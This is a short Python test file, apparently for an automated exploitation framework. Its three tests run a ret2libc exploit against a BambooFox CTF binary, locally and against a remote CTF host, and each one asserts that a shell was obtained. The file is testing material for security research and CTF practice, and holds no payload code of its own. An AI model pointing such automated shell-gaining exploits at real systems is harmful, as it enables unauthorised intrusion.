from .. import *

BIN = "./tests/bamboofox/ret2libc"


def test_ret2libc_local(exploit):
    state = exploit(BIN, lambda: process(BIN))
    state = turnkey.Classic()(state)
    assert assertion.have_shell(state.target)


def test_ret2libc_remote(exploit):
    state = exploit(BIN, lambda: remote("bamboofox.cs.nctu.edu.tw", 11002))
    state = turnkey.Classic()(state)
    assert assertion.have_shell(state.target)


def test_ret2libc_remote_libc_rip(exploit):
    state = exploit(BIN, lambda: remote("bamboofox.cs.nctu.edu.tw", 11002))
    state = turnkey.Classic(lookup=libc.Rip())(state)
    assert assertion.have_shell(state.target)
